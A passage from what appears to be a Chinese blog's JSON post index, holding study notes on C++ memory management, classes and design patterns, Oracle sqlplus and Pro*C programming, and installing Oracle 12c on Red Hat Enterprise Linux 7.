再看const当成员函数的const和non-const版本同时存在，const object只会调用const版本，non-const object只会调用non-const版本 123456charToperator[] (size_type pos) const&#123;&#125;//不必考虑copy on writereference operator[] (size_type pos)&#123;&#125;//必须考虑copy on write 关于new，delete前面提到过如下操作new先分配内存在调用ctor 1Complex *pc = new Complex(1, 2); 编译器转化为 1234Complex *pc;void* mem = operator new (sizeof( Complex) );// 内部调用mallocpc = static_cast&lt; Complex*&gt;(mem);pc-&gt;Comnplex::Complex(1,2); delete 先调用dtor，在释放内存 12String::~String(ps);operator delete(ps); // 内部调用free 重载::operator new ::operator delete ::operator new[] ::operator delete[] 12345678inline void *operator new(size_t size)&#123;&#125;inline void operator delete(void *ptr)&#123;&#125;inline void *operator new(size_t size)&#123;&#125;inline void operator delete[](void *ptr)&#123;&#125; 重载member operator new delete 1234567891011121314151617181920212223242526272829303132333435363738class Foo&#123;public: int _id; long _data; string _str;public: Foo() : _id(0) &#123;&#125; Foo(int i ) : _id(1) &#123;&#125; ~Foo() &#123;&#125; static void *operator new(size_t size); static void operator delete(void *pdead, size_t size); static void *operator new[](size_t size); static void operator delete[](void *pdead, size_t size);&#125;;void Foo::opreator delete(void *pdead, size_t size)&#123; cout &lt;&lt; ... free(pdead);&#125;void* Foo::operator new[](size_t size)&#123; Foo *p = (Foo*) malloc (size); cout &lt;&lt; .. return p;&#125;void Foo::operator delete[](void *pdead, size_t size)&#123; cout &lt;&lt; ... free(pdead);&#125;Foo *pf = new Foo; //若无members就调用globalsdelete pf;Foo *pd = ::new Foo;//强制调用globals::delete pf;Foo* pArray = new Foo[5];delete [] pArray; 每增加一个虚函数，类的大小增加一个指针的字节编译器在构造数组时，后分配4个字节的空间去存储这个数组的大小，这样做可以编译器快速的知道调用几次构造，几次析构 重载new() ,delete()我们可以重载class member operator new() ,写出多个版本，前提时每一个版本的声明必须有独特的参数列，其中第一参数必须是size_t ,其余参数以new所指定的placement arguments为初值。出现new()小括号内的便是p a。 1234567Foo *pf = new (300,'c') Foo;//一般重载void *operator new(size_t size)&#123; return malloc(size); &#125;//placement new()的标准写法void *operator new(size_t szie, void *start)&#123; return start; &#125; 我们也可以重载class member operator delete(),但是他们不会被delete调用。只有当new所调用的ctor抛出异常，才会带调用这些重载版的operator delete()。他只能这样被调用，主要用来clean未完成创建的object所占的memory，即使operator delete() 未能一一对应operator new() ,编译器也不会报错 Basic_string使用new 123456789101112131415161718192021222324252627282930313233343536template&lt;...&gt;class basic_string&#123;private: struct Rep &#123; void release() &#123; if( --ref == 0) delete this;&#125; inline static void* operator new(size_t size); inline static void* operator delete(void *); inline static Rep* create(size_t); ... &#125;; ...&#125;;template&lt;class charT, class traits, class Allocator&gt;inline basic_string&lt;charT, traits, Allocator&gt;::Rep*basic_string&lt;charT, traits, Allocator&gt;::Rep::create(size_t extra)&#123; extra = frob_size(extra + 1); Rep *p = new(extra) Rep; ... return p;&#125;template&lt;class charT, class traits, class Allocator&gt;inline void *basic_string&lt;charT, traits, Allocator&gt;::Rep::operator new (size_t s,size_t extra)&#123; return Allocator::allocate(s + extra * sizeof());//重载placement new&#125;template&lt;class charT, class traits, class Allocator&gt;inline void basic_string&lt;charT, traits, Allocator&gt;::Rep::opreraotr delete(void *ptr)&#123; Allocator::deallocate(ptr...&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"}]},{"title":"oracle配置","slug":"2017-03-28-oracle编程","date":"2017-03-27T16:00:00.000Z","updated":"2018-02-18T03:29:06.000Z","comments":true,"path":"2017/03/28/2017-03-28-oracle编程/","link":"","permalink":"http://coordinate.wang/2017/03/28/2017-03-28-oracle编程/","excerpt":"","text":"管理oracle启动和停止oracle停止和启动oracle需要切换到oracle用户才可以，其他用户都没有权限启动和停止oracle（包括root也没有权限）运行sqlplus但不登录到oracle:sqlplus /nolog以系统管理权的权限连接到oracle服务器conn /as sysdba;启动oracle服务startup停止oracle服务shutdown immediate; 立即关闭-normal 真正关闭-tarnsactional 尽量少影响客户端abort 放弃一切事物，立即关闭 listeneroracle的listener,相当于oracle的TCPserver，liestener会在1521这个端口listen。所有的oracle client端都需要通过listener才能连接到oracle server。启动和停止listener进入listener的管理界面lsnrctl启动listenerstart停止listenerstop sqlplussqlplus是一个最常用的工具，具有很强的功能，主要有：数据库的维护，一般在服务器上操作，不可以远程执行sql语句执行pl/sql执行sql脚本数据的导出，报表用户管理级权限维护生成新的sql脚本 connconn 用户名/密码@网络服务名show user显示当前用户@script.sql执行当前sql脚本文件quit断开数据库连接，退出sqlplus spool该命令可以将sqlplus屏幕上的内容输出到指定文件中去例子 123sql&gt;spool a.txtselect * from tablename;sql&gt;spool off; linesize显示行的宽度，默认80字符 12sql&gt;show linesizesql&gt;set linesize 90 pagesize设置每页显示的行数目，默认14，用法和linesize一样，至于其他环境参数的使用也是大同小异 NLS_LANG环境变量sqlplus通过.bash_profile中的NLS_LANG环境变量决定显示语言中文gbkNLS_LANG=”SIMPLIFIED CHINESE_CHINA.ZHS16GBK”简体中文utf8NLS_LANG=”SIMPLIFIED CHINESE_CHINA.AL32UTF8”在sqlplus中的oracle server短的字符集 1SQL&gt; select userenv('language') from dual; 创建用户create user在oracle中创建一个新的用户使用create user语句，一般是具有dba(数据库管理员)的权限才能使用基本语法：create user 用户名 identified by dbuser1; 1create user dbuser1 identified by dbuser1; 用户赋权grant创建的新用户是没有任何权限的，需要为其指定相应的权限，赋权使用grant，回收权限使用revoke基本语法：grant 权限/角色 to 用户 1grant connect, resource to dbuser1; 删除用户1drop user username 一般以dba的身份去删除莫个用户基本语法：drop user 用户名 1drop user dbuser1; 所有对表的修改，都是在一个事务中，commit后才会有效如果操作失误的话使用rollback命令可以回去 返回指定行数的SELECT查询数据语句ROWNUM的语法 1SELECT * FROM TABLENAME WHERE ROWNUM CONDITIONAL n; CONDITIONAL 代表条件( &lt;, &lt;= ,&gt;, &gt;=)，其中n是返回数SELECT * FROM table1 WHERE ROWNUM &lt;= 5;可以=1但是别的数不可以 主键与序列CREATE TABLE建立表的时候同时可以指定一个字段为主键CONSTRAINT 主键名 PRIMARY KEY 主键字段名例子： 1CREATE TABLE table1 (id int, name varchar2(100), CONSTRAINT pk_id PRIMARY KEY(id)); ORACLE 创建序列语句CREATE SEQUENCE 序列名increment by 序列步长sart with 序列起始值mxvalue 序列最大值例子： 12345CREATE SEQUENCE seqlincrement by 1start with 1maxvalue 9999999；insert into table1 (id,name) values (0,'sd'); 出现如下错误ORA-01950: 对表空间 ‘USERS’ 无权限解决方案：在sys用户下 1SQL&gt; alter user c##dbuser1 quota unlimited on USERS; 删除序列DROP SEQUENCE 序列名得到序列的下一个值序列名.nextval例子： 1INSERT INTO table1 (id,name) VALUES (seql.nextval,’tom’); 要注意的是这个nextval是个全局变量，所以往不同的表插都会增加在oracle下，如果用varchar这个数据类型，推荐用varchar2 Oracle编程Proc程序设计通过在过程化编程语言中嵌入sql语句而开发出的应用程序成为pro程序,在c/c++语言中嵌入sql语句而开发出的应用程序成为pro*c/c++程序。Proc常用选项 Makefile文件例子 123456789101112131415161718192021222324252627.SUFFIXES:.c .oCC=gccPROC=procPROCSRCS=oracle.pcSRCS=$(PROCSRCS:.pc=.c)OBJS=$(SRCS:.c=.o)ORACLE_HOME=/opt/oracle/product/12.2.0/dbhome_2ORAFLAGS1=/usr/include/linuxORAFLAGS2=/usr/lib/gcc/x86_64-redhat-linux/4.8.2/includeEXEC=abcstart: $(OBJS) $(CC) -o $(EXEC) $(OBJS) -L$(ORACLE_HOME)/lib -lclntsh @echo '----------------ok-----------------'.c.o: $(SRCS) $(CC) -Wall -g -o $@ -c $&lt; $(SRCS): $(PROC) INAME=$(PROCSRCS) INCLUDE=$(ORAFLAGS1) INCLUDE=$(ORAFLAGS2) CPOOL=YES MODE=ANSI CODE=ANSI_C PARSE=PARTIAL THREADS=YES ONAME=$(SRCS)clean: rm -f $(OBJS) rm -f $(SRCS) rm -f core* 1234567891011121314151617181920212223242526272829//pc文件中，如果是嵌入式的sql语句要增加的话//proc PARSE=PARTIAL ,变量必须在begin和end之间定义EXEC SQL BEGIN DECLARE SECTION; sql_context pContext; long SQLCODE; //变量的类型和名称都不可以变EXEC SQL END DECLARE SECTION;extern void sqlglmt(void*, char*, size_t*, size_t* ); //安装错误处理函数void sql_error()&#123; char sErrorString[512];//自定义一个数组，数组的名字可以自定义 size_t tMessageSize = 0; size_t tErrorSize = sizeof(sErrorString); memset(sErrorString, 0, sizeof(sErrorString)); sqlglmt(pContext, sErrorString, &amp;tErrorSize, &amp;tMessageSize);//调用sqlglmt这个函数得到具体错误描述 sErrorString[tMessageSize] = 0;//设置错误描述字符串最后以0结尾 printf(\"%s\\n\", sErrorString);//打印错误描述&#125;//初始化数据库void sql_init()&#123; SQLCODE = 0; pContext = NULL; EXEC SQL ENABLE THREADS;//可以在代码当中生成线程相关代码 EXEC SQL CONTEXT ALLOCATE :pContext;//为pContext分配内存 EXEC SQL CONTEXT USE :pContext;//使用pContext&#125; 连接到数据库 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152int sql_connect(const char *user, const char *passwd, const char *dbname)&#123; EXEC SQL BEGIN DECLARE SECTION; const char *sUser; const char *sPasswd; const char *sDBname; EXEC SQL END DECLARE SECTION; SQLCODE = 0; sUser = user; sPasswd = passwd; sDBname = dbname;//在嵌入式SQL语句里面 冒号代表要用输入变量 EXEC SQL CONNECT :sUser IDENTIFIED BY :sPasswd USING :sDBname; if (SQLCODE != 0) &#123; sql_error(); return 1; &#125;else &#123; return 0; &#125;&#125;int sql_disconnect()&#123; SQLCODE = 0; EXEC SQL ROLLBACK WORK RELEASE; if (SQLCODE != 0) &#123; sql_error(); return 1; &#125;else &#123; return 0; &#125;&#125;int sql_free()&#123; SQLCODE = 0; EXEC SQL CONTEXT FREE :pContext; if (SQLCODE != 0) &#123; sql_error(); return 1; &#125;else &#123; return 0; &#125; &#125; 积累drop user ×× ； 仅仅是删除用户如果用户下有对象，那么drop user ×× ；会报错ORA-01922: 必须指定 CASCADE 以删除 ××drop user ×× cascade ；会删除此用户名下的所有表和视图使用cascade参数可以删除该用户的全部objects。如果用户的schema中有表，则在删除表的时候自动删除与该表相关的主键和外键。如果用户的schema中有表，则在删除表的时候自动删除与该表相关的索引。 oracle 12g创建用户必须加c##吗你是建成了CDB导致 用户必须加C##， dbca重新建一个库 然后不要选择CDB 就会和以前的版本一样没有这个限制， CDB不适合新手或者初学者","categories":[{"name":"Database","slug":"Database","permalink":"http://coordinate.wang/categories/Database/"}],"tags":[{"name":"oracle","slug":"oracle","permalink":"http://coordinate.wang/tags/oracle/"}]},{"title":"oracle配置","slug":"2017-03-27-oracle的配置","date":"2017-03-26T16:00:00.000Z","updated":"2018-02-18T03:29:05.983Z","comments":true,"path":"2017/03/27/2017-03-27-oracle的配置/","link":"","permalink":"http://coordinate.wang/2017/03/27/2017-03-27-oracle的配置/","excerpt":"","text":"Redhat enterprise 7安装oracle12安装必须的包根据oracle官网上提供的文档，得到如下信息 1234567891011121314151617181920212223242526272829binutils-2.23.52.0.1-12.el7.x86_64 compat-libcap1-1.10-3.el7.x86_64 gcc-4.8.2-3.el7.x86_64 gcc-c++-4.8.2-3.el7.x86_64 glibc-2.17-36.el7.i686glibc-2.17-36.el7.x86_64 glibc-devel-2.17-36.el7.i686 glibc-devel-2.17-36.el7.x86_64 kshlibaio-0.3.109-9.el7.i686 libaio-0.3.109-9.el7.x86_64 libaio-devel-0.3.109-9.el7.i686 libaio-devel-0.3.109-9.el7.x86_64 libgcc-4.8.2-3.el7.i686 libgcc-4.8.2-3.el7.x86_64 libstdc++-4.8.2-3.el7.i686 libstdc++-4.8.2-3.el7.x86_64 libstdc++-devel-4.8.2-3.el7.i686 libstdc++-devel-4.8.2-3.el7.x86_64 libXi-1.7.2-1.el7.i686 libXi-1.7.2-1.el7.x86_64 libXtst-1.2.2-1.el7.i686 libXtst-1.2.2-1.el7.x86_64 unixODBC-2.3.1-10.el7.i686.rpmunixODBC-2.3.1-10.el7.x86_64.rpmunixODBC-devel-2.3.1-10.el7.i686.rpmunixODBC-devel-2.3.1-10.el7.x86_64.rpmmake-3.82-19.el7.x86_64 sysstat-10.1.5-1.el7.x86_64 无论你是选择rpm还是选择yum，这些包必须安装好，在Red Hat Enterprise Linux 7.0 的光盘中，这些包都存在，这里说一下Red Hat Enterprise Linux配置本地源的事情 配置本地源我从来都是将Red Hat Enterprise Linux 7.0的光盘.iso文件上传到系统里，在这里，我将光盘传到/home/yunchu/Desktop里，yunchu是我个人用户名。获得超级权限后在/media下，新建一个文件夹cdrom。具体将光盘挂载到什么地方，自己选择。我选择挂载到/media/cdrom下 1[root@localhost Desktop]#mount rhel-server-7.0-x86_64-dvd.iso /media/cdrom 在/etc/yum.repos.d/ 下面 123456789101112[root@localhost yum.repos.d]# touch rhel-media.repo //新建一个rhel-media.repo文件[root@localhost yum.repos.d]# vi rhel-media.repo //编辑文件[rhel-media] #1行name=Red Hat Enterprise Linux 7.0baseurl=file:///media/cdromenabled=1gpgcheck=1gpgkey=file:///media/cdrom/RPM-GPG-KEY-redhat-release #6行//#1行到#6行以直接复制到rhel-media.repo中，汉字不需要复制，这段说明不需要复制[root@localhost yum.repos.d]# yum clean all[root@localhost yum.repos.d]# yum makecache 搞定用yum安装很快的 添加组和用户1234groupadd dbagroupadd oinstalluseradd oracle –d /home/oracle –g oinstall –G dba –m passwd oracle 不能设123 QAQ 预先创建安装目录1234mkdir –p /opt/oracle/productmkdir –p /opt/oracle/product/12.2.1mkdir –p /opt/oraInventorymkdir –p /opt/oracle/oradata 设置目录的所有者所属组和权限 12345chown –R oracle.oinstall /opt/oraclechown –R oracle.oinstall /opt/oracle/oradatachown –R oracle.oinstall /opt/oracle/product/12.2.1chown –R oracle.oinstall /opt/oraInventorychown oracle.dba /opt/oracle 设置环境变量1234567891011su – oraclecdvi .bash_profileexport ORACLE_BASE=/opt/oracleexport ORACLE_HOME=$ORACLE_BASE/product/12.2.1export ORACLE_OWNER=oracleexport ORACLE_SID=orclexport PATH=$PATH:$HOME/bin:.:$ORACLE_HOME/binexport LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/libexport NLS_LANG=\"SIMPLIFIED CHINESE_CHINA.AL32UTF8\" 后退出. .bash_profile让文件生效 在oracle用户下解压oracle安装包 1mv linuxx64_12201_database.zip /home/oracle 安装oracle database用户oracle登陆进入database目录执行 1234chmod +x install/.ouichomd +x install/unzipchmod +x runInstaller./runInstaller 配置监听程序打开一个新的终端，执行netca设置 再次打开netca设置 这里填写的是自己的IP 添加数据库用户用oracle登陆linux，在命令行输入 1sqlplus /nolog 进入sqlplus命令提示符，输入 1conn /as sysdba 在sqlplus 命令提示符输入create user dbuser1 identified by dbuser1; 一定要以;结尾 在这里我们碰到这个问题oracle报ORA-01034错误解决办法是 connect /as sysdba; startup exitQAQ不幸的是又再次报错了oracle12创建用户错误ORA-65096: 公用用户名或角色名无效 invalid common user or role name解决办法 12SQL&gt; create user C##fdf01 IDENTIFIED BY fdf01;User created. 根据错误提示了解，在CDB中用户得以C##开头;做完这些后，给用户添加权限 1grant connect,resource to dbuser1; 退出现在的用户，我们登陆到这个用户使用这个指令sqlplus 账户名/密码@orcl 注意这里的orcl是前面设置的 linux下停止oracle的方法在oracle用户下 123sqlplus /nologconnect /as sysdba;shutdown; 使用quit命令退出sqlplus在命令提示符下执行 1lsnrctl 在命令提示符下执行 1stop 启动oracle的方法在oracle用户下 123sqlplus /nologconnect /as sysdba;startup quit命令退出sqlplus在命令行执行 1lsnrctl 在lsnrctl提示符执行 1start 如果想修改用户密码 1alter user dbuser1 identified by newpasswd 如果想删除该用户 1drop user dbuser1 积累设置字符启动界面 1systemctl set-default multi-user.target 图形界面graphical.target查看剩余空间df /optmysql端口是3306oracle端口是1521 解决退格键回显的问题 要使用回删键（backspace）时，同时按住ctrl键 设定环境变量在bash下：$ stty erase ^?或者把 stty erase ^? 添加到.bash_profile中。在csh下：$ stty erase ^H或者把 stty erase ^H 添加到.cshrc中 在脚本的开头可结尾 参数 stty erase ^H stty erase ^?","categories":[{"name":"Database","slug":"Database","permalink":"http://coordinate.wang/categories/Database/"}],"tags":[{"name":"oracle","slug":"oracle","permalink":"http://coordinate.wang/tags/oracle/"}]},{"title":"再看c++","slug":"2017-03-26-再看c++","date":"2017-03-25T16:00:00.000Z","updated":"2018-02-18T03:29:05.967Z","comments":true,"path":"2017/03/26/2017-03-26-再看c++/","link":"","permalink":"http://coordinate.wang/2017/03/26/2017-03-26-再看c++/","excerpt":"","text":"Object Based基于对象这里的类型是含有指针 1234567891011class String&#123;public: string(constchar* cstr = 0); string(conststring&amp; str); string&amp;operator=(const String&amp; str); ~String(); char *get_c_str()const &#123; return m_data; &#125;private: char *m_data;&#125;; ctor和dtor1234567891011121314151617181920inlineString::String(const char * cstr = 0)&#123; if( cstr) &#123; m_data = new char[strlen(cstr) + 1]; strcpy(m_data, cstr); &#125; else &#123; m_data = new char [1]; *m_data = ‘\\0’; &#125;&#125;inlineString::String()&#123; delete[] m_data;&#125; copy constructor如果使用的是默认拷贝的话，只会copy指针，指针指向的值不会copy 123456inlineString::String(const String&amp; str)&#123; m_data = newchar[ strlen(str.m_data + 1)]; strcpy(m_data,str.m_data);&#125; copy assignment operator12345678910inline String&amp; String::operator=(constString&amp; str)&#123; if(this == &amp;str) return *this; //self assignment delete[] m_data; m_data = newchar[ strlen(str.m_data) + 1]; strcpy(m_data,str.m_data); return *this;&#125; 这里self assignment的原因在于我们在copy之前调用了delete stack and heapstack是存在于某个作用域内的内存空间，但你调用函数，函数本身会形成一个stack用来放置他所接受的参数，以及返回地址。在函数本体内申明的任何变量，其所使用的内存块都取自于上述的stackHeap，是指由系统提供的一块global内存空间，程序可动态分配Complex c1(1,2)c1便是所谓的stack object，其生命在作用域结束之后结束。 1static Complex c2(1,2); c1便是所谓的static object，其生命在作用域结束之后任然存在，在整个程序结束后结束。 123Complex c3(1,2);int main()&#123; &#125; c3便是global object，他的生命在程序结束后才结束，你也可以把它视为static objectnew先分配内存在调用ctor 1Complex *pc = new Complex(1, 2); 编译器转化为 1234Complex *pc;void* mem = operator new (sizeof( Complex));// 内部调用mallocpc = static_cast&lt; Complex*&gt;(mem);pc-&gt;Comnplex::Complex(1,2); delete 先调用dtor，在释放内存 12String::~String(ps);operator delete(ps); // 内部调用free array new一定要搭配array deletedelete[] p;与delete p;都会删除内存 但是问题不是发生这里，第一种写法会告诉编译器调用三次析构函数 而第二个会调用一次析构函数。最后的指针空间都会被释放，但是这里指针所指向的内存空间在第二种情况下会发生内存泄漏。但是如果一个类里面没有指针的话。那这两种就没有区别，但是区别做是一种好的习惯。 关于staticstatic data members同一个类不同对象具有相同的值时，使用静态成员变量static member functions静态函数没有this pointer，所以他不可像一般函数那样访问非静态成员数据，所以他只可以访问静态成员数据。 1234567class Account&#123;public: static double m_rate; static void set_rate(const double&amp; x) &#123; m_rate = x;&#125;];double Account::m_rate = 8.0; 调用static函数的方式通过object调用和通过class name调用多谈几句问题1： 为什么在类内的静态成员定义后，要到类的外部在定义和初始化？答：首先这句话就是错的，在类内的静态成员变量只是一定声明，并没有分配相应的内存空间；在类外，相当于定义加上初始化，如果只是定义，也是能够编译成功的，因为分配了内存。等价于全局变量，但只属于类。 问题2：为什么类的静态成员在类外部的定义只能一次?答：好比全局变量的多重定义另外，任何变量都只进行一次初始化。局部变量在程序块结束时生存期就结束了，下次再调用这个程序块时从原理上说声明的是另一个变量了(分配到的地址也不一定一样)。PS：在不同编译器的不同编译情况时，实际的内存分区可能不同。例如TC的Small模式下堆和栈区是重合的，而Tiny模式下连静态区域和动态区域都是重合的。 问题3：私有的静态成员变量如何初始化，访问权限还是私有么？答：显然，也是在类的外部进行初始化，但是访问权限是存在的。比如不能在程序执行的过程中直接用类名加作用域来访问此私有的静态成员。需要通过类公有的外部接口来访问，包括静态与非静态接口。 问题4：在程序执行过程中，其他类的对象改变静态成员变量的值，那么相应的在建立另一个对象时的静态成员值会是初始化的值还是上一次改变的值？答：是上一次改变的值，因为初始化是分配内存，赋初值。 问题5：类的非静态成员函数中能访问静态成员变量么？答：是可以访问的，前提是要对静态的进行外部的初始化。如果为初始化，则会报错，是链接错误，显然在类内部只是声明，并没有在类的外部进行定义与初始化，未分配内存。 问题6：类的静态成员函数中能访问非静态成员变量么？答：不能，解析不了。非静态成员，不是一个特定的对象的，既没有this指针，指向，根本找不到。 首先问题来自这个函数: 123456int fun()&#123; static int i=0; i++; return i;&#125; 当这个函数被反复调用时,i的值是会一直加的,也就是静态变量只被初始化了一次.我对此产生了疑惑.不知道大家有没有.当改为: 123456int fun()&#123; i=0; ++i; return i;&#125; 反复调用时都返回的是1; 这个例子很明白,虽然i这个变量时同名的,但是地址是不一样的,这是一个新的变量,因为在作用域后,原变量被销毁了.接着创建一个新的变量.那么这里我们就知道了一件事情:就是静态变量是全局的,和程序的生命周期是一样的.那么原来的staic的i依然存在. 但是它的可访问区域就只能是定义的作用域,而不一定能全局访问,这是全局变量的一个差别.而静态变量的必须初始化,如果没有显示初始化,则初始化为0 ,’0’或者其他.初始化在程序第一次加载中开始.并设置了相应的标志位!所以当变量重复时,编译器忽略了重复初始化的代码,到这里就算是C++只能初始化一次的原因了!操作系统在加载程序时会根据程序中的声明部分为程序分配内存空间(这部分数据是由编译器生成的)。程序所支配的内存空间分为两大部分：静态区域和动态区域(至于为什么这样区分涉及到硬件知识，建议LZ不要深究)：动态区域用于存储经常会变动的数据(动态区域又分为两大部分：栈和堆，关于这两个部分大家应该都很熟悉了)；静态区域(Java里称为永久区域)用于存储不会经常变化的数据，例如程序的指令代码(C/C++里就是各个函数编译后得到的代码)、用户类型(结构体、类)的声明代码、全局变量、静态变量有些例子提到用静态变量来做递归的计数器，那只是为了说明静态变量的特性。实际上不推荐这种用法，因为这样会对程序性能造成轻微的影响。静态区域内的数据会在程序加载时进行初始化，生存期为程序运行的全部时间。 关于singleton这个设计模式主要目的是想在整个系统中只能出现一个类的实例。这样做当然是有必然的，比如你的软件的全局配置信息，或者是一个Factory，或是一个主控类，等等。 123456789101112131415class A&#123;public: static A&amp; getInstance ( return a; ); setup() &#123; &#125;private: A(); A(const A&amp; rhs);&#125;;A&amp; A::getInstance()&#123; static A a; return a;&#125;A::getInstance.setup(); 关于function template 1234567template &lt;class T&gt;inline const T&amp; min(const T&amp; a, constT&amp; b)&#123; return b &lt; a ? b : a; // &lt; overload&#125;r3 = min( r1, r2); 编译器会对function template 进行argument deduction,所以像模板类一样不用写类型 member template 123456789101112131415161718template &lt;class T1, class T2&gt;struct pair&#123; typedef T1 first_type; typedef T2 second_type; T1 first; T2 second; pair() : first(T1()), second(T2()) &#123;&#125; pair(const T1&amp; a, const T2&amp; b) : first(a) ,second(b) &#123;&#125; template &lt;class U1, class U2&gt; pair(const pair&lt;U1, U2&gt;&amp; p : first(p.first), second(p.second) &#123;&#125;&#125;; 关于namespace 123namespce std&#123;&#125; 关于type conversion operator(类型转换操作符)类型转换操作符（type conversion operator）是一种特殊的类成员函数，它定义将类类型值转变为其他类型值的转换。转换操作符在类定义体内声明，在保留字 operator 之后跟着转换的目标类型。boost::ref和boost::cref就使用到了类型转换操作符。 T1::operator T2() [const]; //T1的成员函数，”(T2)a”类型转换转换函数必须是成员函数，不能指定返回类型，并且形参表必须为空；返回值是隐含的，返回值是与转换的类型相同的，即为上面原型中的T2；T2表示内置类型名（built-in type）、类类型名（class type）或由类型别名（typedef）定义的名字；对任何可作为函数返回类型的类型（除了 void 之外）都可以定义转换函数，一般而言，不允许转换为数组或函数类型，转换为指针类型（数据和函数指针）以及引用类型是可以的；转换函数一般不应该改变被转换的对象，因此转换操作符通常应定义为 const 成员；支持继承，可以为虚函数；只要存在转换，编译器将在可以使用内置转换的地方自动调用它； Object oriented programming面向对象Composition 复合has-a123456789101112131415Adapter模式template &lt;class T, class Sequence = deque&lt;T&gt; &gt;class queue&#123; …protected: Sequence c;public: bool empty() const &#123; return c.empty(); &#125; size_type size() const &#123; return c.size(); &#125; reference front() &#123; return c.front(); &#125; reference back() &#123; return c.back(); &#125; void push (const value_type&amp; x) &#123; return c.push_back(x); &#125; void pop() &#123; c.pop_front(); &#125;&#125;; 更深层的复合Container &lt;&gt; – –&gt;component构造由内而外Container 的构造函数首先调用Component的default构造函数，然后才执行自己Container::Container(…) : Component() { … }析构由外向内Container 的析构函数首先执行自己，然后才调用Component的析构函数Container::~Container() : {…~Component() }; 12345678910111213141516171819202122232425262728Delegation 委托Composition by referenceString.hpp文件class StringRep;class String&#123;public: String(); String( const char *s); String(const String &amp;s); String &amp;operator=(const String&amp; s); ~String();private: StringRep *rep; //pimpl handle/body&#125;;Cpp文件#include “String.hpp”namespace &#123; class StringRep &#123; friend class String; StringRep(const char *); ~StringRep(); int count; char *rep; &#125;;&#125;String::String()&#123; … &#125; 123456789101112Inheritance继承 is-astruct _List_node_base&#123; _List_node_base *_M_next; _List_node_base *_M_prev;&#125;;template &lt;typename _Tp &gt;struct _List_node: public _List_node_base&#123; _Tp _M_data;&#125;; 构造由内而外base 的构造函数首先调用derived的default构造函数，然后才执行自己derived::derived(…) : base() { … }析构由外向内derived 的析构函数首先执行自己，然后才调用base的析构函数derived::~ derived () : {…~base() };注意base class 的dtor必须是virtual否则会出现undefined behavior Inheritance with virtual functions继承的是调用权non-virtual函数：不希望dervied class重新定义override它virtual 函数：希望derived class重新定义override它，他已有默认定义。pure virtual函数：希望derived class一定要重新定义override它，你对他没有默认定义。 12345678class Shap&#123; virtual void draw() const = 0; //pure virtual virtual void error(const std::string&amp; msg); // impure virtual int objectID() const; //non-virtual&#125;;class Rectangle : public Shape &#123; … &#125;;class Ellipse : public Shape &#123; … &#125;; Delegation and InheritanceObserver模式 12345678910111213141516171819202122232425class Subject&#123; int m_value; vector&lt; Observer* &gt;m_views;public: void attach( Observer *obs)&#123; m_views.push_back(obs);&#125;void set_val (int value)&#123; m_value = value; notify();&#125;void notify()&#123; for( int I = 0; I &lt; m_views.size(); ++i) m_views[i]-&gt;update(this, m_value);&#125;&#125;;class Observer&#123;public: virtual void update(Subject *sub, int value ) = 0;&#125;;//作为父类派生出多个观察者，放入容器中 Composite模式 1234567891011121314151617181920212223class Component&#123; int value;public: Component(int val) &#123; value = val; &#125; virtual void add( Component *)&#123;&#125;&#125;;class Primitive: public Component&#123;public: Primitive(int val) : Component(val) &#123;&#125;&#125;;class Composite: public &#123; vecotor&lt; Component *&gt;public: Composite(int val) :Component(val) &#123;&#125; void add(Component *elem)&#123; c.push_back(elem);&#125;…&#125;; Prototype模式创建未来的对象 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;iostream.h&gt;enum imageType&#123; LAST, SPOT&#125;;class Image&#123;public: virtual void draw() = 0; static Image *findAndClone(imageType);protected: virtual imageType returnType() = 0; virtual Image *clone() = 0; static void addPrototype( Image *image) &#123; _prototypes[_nextSlot++] = image; &#125;private: static Image * prototypes[10]; static int _nextSlot;&#125;;Image *Image::_prototypes[];int Image::_nextSlot;Image *Image::findAndClone(imageType type)&#123; for(int I = 0; I &lt; _nextSlot; ++i) &#123; if(_prototypes[i]-&gt;returnType() == type) &#123; return _prototypes[i]-&gt;clone(); &#125; &#125;&#125;class LandSatImage::public Image&#123;public: imageType returnType() &#123; return LSAT; &#125; void draw() &#123; cout &lt;&lt; \"LandSatImage::draw\" &lt;&lt; _id &lt;&lt; endl; &#125; Image *clone() &#123; return new LandSatImage(1); &#125;protected: LandSatImage(int dummy) ///这里私有保护都可以 &#123; _id = count++; &#125;private: static LandSatImage _LandSatImage; LandSatImage() &#123; addPrototype(this); &#125; int _id; static int _count;&#125;LandSatImage LandSatImage::_LandSatImage;int LandSatImage::_count = 1; conversion function转换函数123456789101112131415class fraction &#123;public:Fraction (int num, int den = 1) : m_numberator ( num ), m_denominator(den) &#123;&#125;operator double() const&#123;return (double) (m_numerator / m-denominator;&#125;private:int m_numerator;int m_denominator;&#125;Fraction f(3,5);double d = 4 + f; non-explicit-one-argument ctor123456789101112131415class Fraction&#123;public: Fraction(int num, int den = 1) : m_numberator(num), m_denbominator(den)&#123;&#125; Fraction operator+(const Fraction&amp; f) &#123; return Fraction(...); &#125;private: int m_numerator; int m_denominator;&#125;;Fraction f(3,5);Fraction d2 = f + 4;//调用 non-explicit ctor将4转化为Fraction(4,1) 注意的是如果一个类里面同时有这两个的话会报错，出现二意 123456789101112131415class Fraction&#123;public: explicit Fraction(int num, int den = 1) : m_numberator(num), m_denbominator(den)&#123;&#125; Fraction operator+(const Fraction&amp; f) &#123; return Fraction(...); &#125;private: int m_numerator; int m_denominator;&#125;;Fraction f(3,5);Fraction d2 = f + 4;//error声明为explicit的构造函数不能在隐式转换中使用 pointer-like class关于智能指针智能指针(smart pointer)是存储指向动态分配（堆）对象指针的类，用于生存期控制，能够确保自动正确的销毁动态分配的对象，防止内存泄露。 123456789101112131415161718192021222324252627282930template&lt;class T&gt;class shared_ptr&#123;public: T&amp; operator* () const &#123; return *px; &#125; T* operator-&gt;() const &#123; return px; &#125; shared_ptr(T* p): px(p) &#123;&#125;private: T* px; long* pn; ...&#125;;shared_ptr&lt;Foo&gt; sp(new Foo);Foo f(*sp);sp-&gt;method();关于迭代器template&lt;class T, class Ref, class Ptr&gt;struct _list_iterator&#123; typedef _list_iterator&lt;T, Ref, Ptr&gt; self; typedef Ptr pointer; typedef Ref reference; typedef _list_node&lt;T&gt;* link_type; link_type node; reference operator*() const &#123; return (*node).data; &#125; pointer operator-&gt;() const &#123; return 